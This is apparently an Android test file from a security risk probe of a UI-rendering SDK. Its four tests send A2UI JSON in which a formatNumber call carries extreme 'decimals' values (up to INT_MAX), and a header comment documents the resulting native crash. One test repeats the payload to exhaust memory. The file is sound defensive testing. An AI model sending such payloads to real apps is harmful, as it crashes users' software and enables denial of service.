package com.amap.agenuiplayground.tests;

import androidx.test.ext.junit.runners.AndroidJUnit4;

import com.amap.agenuiplayground.base.AGenUIBaseTest;

import org.junit.Test;
import org.junit.runner.RunWith;

/**
 * RISK61: FormatNumber extreme decimals → SIGSEGV / std::bad_alloc → native crash
 *
 * Risk hypothesis (CONFIRMED via local C++ verification):
 *   FormatNumberFunctionCall::execute() passes the user-supplied "decimals" arg
 *   directly to std::setprecision() without upper-bound validation.
 *
 *   - decimals = INT_MAX (2,147,483,647) → SIGSEGV (signal 11) on all platforms
 *   - decimals = 2,000,000,000 → ~2GB allocation, OOM on mobile (SIGKILL/bad_alloc)
 *   - decimals = 500,000,000  → ~500MB allocation, OOM on most mobile devices
 *
 *   FunctionCallManager::executeFunctionCallSync() has no try-catch around
 *   execute(), so any thrown exception propagates to std::terminate → abort.
 *   For SIGSEGV cases, the crash is immediate without exception.
 *
 * Local verification evidence (macOS arm64):
 *   setprecision(2000000000) → OK (2GB string, machine has enough RAM)
 *   setprecision(INT_MAX)    → Segmentation fault: 11 (exit code 139)
 *
 * Entry surface: SurfaceManager.receiveTextChunk() with A2UI protocol containing
 *   a Text component whose "text" attribute is a formatNumber FunctionCall with
 *   extreme decimals value.
 *
 * Probe style: boundary / abnormal input (extreme integer parameter)
 *
 * Code path:
 *   receiveTextChunk → StreamingContentParser → SurfaceCoordinator::updateComponents
 *   → ComponentManager::flushDirtyComponent → ComponentModel::buildSnapshot
 *   → DataValue::getValueData → FunctionCallManager::executeFunctionCallSync (NO try-catch)
 *   → FormatNumberFunctionCall::execute (L29: oss << std::fixed << setprecision(INT_MAX) << value)
 *   → SIGSEGV (immediate) or std::bad_alloc → std::terminate → SIGABRT
 */
@RunWith(AndroidJUnit4.class)
public class SDKRiskProbeFormatNumberOOMCrashTest extends AGenUIBaseTest {

    private static final String SURFACE_ID = "risk61-fmt-num";

    /**
     * Test 1: formatNumber with decimals = 2,000,000,000 (2 billion).
     * Expected: process crash (SIGABRT from std::bad_alloc).
     */
    @Test
    public void testSDKRISK61_formatNumberExtremeDecimals_crash() throws Exception {
        String createSurface = "{\"version\":\"v0.9\",\"createSurface\":{"
                + "\"surfaceId\":\"" + SURFACE_ID + "\","
                + "\"catalogId\":\"https://a2ui.org/specification/v0_9/catalogs/basic/catalog.json\"}}";

        // Component with formatNumber function call using extreme decimals
        String updateComponents = "{\"version\":\"v0.9\",\"updateComponents\":{"
                + "\"surfaceId\":\"" + SURFACE_ID + "\","
                + "\"components\":["
                + "{\"id\":\"root\",\"component\":\"Column\",\"children\":[\"crash-text\"]},"
                + "{\"id\":\"crash-text\",\"component\":\"Text\","
                + "\"text\":{\"call\":\"formatNumber\","
                + "\"args\":{\"value\":3.14,\"decimals\":2000000000},"
                + "\"returnType\":\"string\"}}"
                + "]}}";

        surfaceManager.beginTextStream();
        surfaceManager.receiveTextChunk(createSurface);
        surfaceManager.endTextStream();

        // Allow surface creation to complete
        Thread.sleep(500);

        // Send the malicious component — this triggers the function call evaluation
        surfaceManager.beginTextStream();
        surfaceManager.receiveTextChunk(updateComponents);
        surfaceManager.endTextStream();

        // Wait for worker thread to process and crash
        Thread.sleep(10000);

        // If we reach here, the crash did not occur (unexpected)
    }

    /**
     * Test 2: formatNumber with decimals = 500,000,000 (500 million).
     * Even a "smaller" extreme value should exhaust memory on mobile devices.
     */
    @Test
    public void testSDKRISK61_formatNumberLargeDecimals_crash() throws Exception {
        String createSurface = "{\"version\":\"v0.9\",\"createSurface\":{"
                + "\"surfaceId\":\"" + SURFACE_ID + "-2\","
                + "\"catalogId\":\"https://a2ui.org/specification/v0_9/catalogs/basic/catalog.json\"}}";

        String updateComponents = "{\"version\":\"v0.9\",\"updateComponents\":{"
                + "\"surfaceId\":\"" + SURFACE_ID + "-2\","
                + "\"components\":["
                + "{\"id\":\"root\",\"component\":\"Column\",\"children\":[\"crash-text\"]},"
                + "{\"id\":\"crash-text\",\"component\":\"Text\","
                + "\"text\":{\"call\":\"formatNumber\","
                + "\"args\":{\"value\":1.0,\"decimals\":500000000},"
                + "\"returnType\":\"string\"}}"
                + "]}}";

        surfaceManager.beginTextStream();
        surfaceManager.receiveTextChunk(createSurface);
        surfaceManager.endTextStream();

        Thread.sleep(500);

        surfaceManager.beginTextStream();
        surfaceManager.receiveTextChunk(updateComponents);
        surfaceManager.endTextStream();

        Thread.sleep(10000);
    }

    /**
     * Test 3: formatNumber with decimals = INT_MAX (2,147,483,647).
     * Maximum possible int value — guaranteed to exceed any device memory.
     */
    @Test
    public void testSDKRISK61_formatNumberIntMaxDecimals_crash() throws Exception {
        String createSurface = "{\"version\":\"v0.9\",\"createSurface\":{"
                + "\"surfaceId\":\"" + SURFACE_ID + "-3\","
                + "\"catalogId\":\"https://a2ui.org/specification/v0_9/catalogs/basic/catalog.json\"}}";

        String updateComponents = "{\"version\":\"v0.9\",\"updateComponents\":{"
                + "\"surfaceId\":\"" + SURFACE_ID + "-3\","
                + "\"components\":["
                + "{\"id\":\"root\",\"component\":\"Column\",\"children\":[\"crash-text\"]},"
                + "{\"id\":\"crash-text\",\"component\":\"Text\","
                + "\"text\":{\"call\":\"formatNumber\","
                + "\"args\":{\"value\":0.1,\"decimals\":2147483647},"
                + "\"returnType\":\"string\"}}"
                + "]}}";

        surfaceManager.beginTextStream();
        surfaceManager.receiveTextChunk(createSurface);
        surfaceManager.endTextStream();

        Thread.sleep(500);

        surfaceManager.beginTextStream();
        surfaceManager.receiveTextChunk(updateComponents);
        surfaceManager.endTextStream();

        Thread.sleep(10000);
    }

    /**
     * Test 4: Rapid repeated formatNumber with large decimals (stress + boundary).
     * Even if a single call doesn't crash, rapid repeated allocations of ~500MB
     * strings will exhaust the app's memory budget and trigger OOM kill.
     * On emulator: tests memory pressure accumulation.
     * On real device: guaranteed crash within 2-3 iterations.
     */
    @Test
    public void testSDKRISK61_formatNumberRepeatedLargeAllocation_oomCrash() throws Exception {
        String createSurface = "{\"version\":\"v0.9\",\"createSurface\":{" 
                + "\"surfaceId\":\"" + SURFACE_ID + "-stress\","
                + "\"catalogId\":\"https://a2ui.org/specification/v0_9/catalogs/basic/catalog.json\"}}";

        surfaceManager.beginTextStream();
        surfaceManager.receiveTextChunk(createSurface);
        surfaceManager.endTextStream();
        Thread.sleep(300);

        // Rapid-fire 10 surfaces each with decimals=500000000 (~500MB per call)
        // Total: ~5GB allocation pressure in rapid succession
        for (int i = 0; i < 10; i++) {
            String surfaceId = SURFACE_ID + "-stress-" + i;
            String create = "{\"version\":\"v0.9\",\"createSurface\":{" 
                    + "\"surfaceId\":\"" + surfaceId + "\","
                    + "\"catalogId\":\"https://a2ui.org/specification/v0_9/catalogs/basic/catalog.json\"}}";
            String update = "{\"version\":\"v0.9\",\"updateComponents\":{" 
                    + "\"surfaceId\":\"" + surfaceId + "\","
                    + "\"components\":[" 
                    + "{\"id\":\"root\",\"component\":\"Column\",\"children\":[\"t\"]}" 
                    + ",{\"id\":\"t\",\"component\":\"Text\","
                    + "\"text\":{\"call\":\"formatNumber\","
                    + "\"args\":{\"value\":1.23,\"decimals\":500000000},"
                    + "\"returnType\":\"string\"}}]}}";

            surfaceManager.beginTextStream();
            surfaceManager.receiveTextChunk(create);
            surfaceManager.receiveTextChunk(update);
            surfaceManager.endTextStream();
            // Don't wait - fire as fast as possible to accumulate memory
            Thread.sleep(50);
        }

        // Wait for all worker thread processing
        Thread.sleep(15000);
    }
}
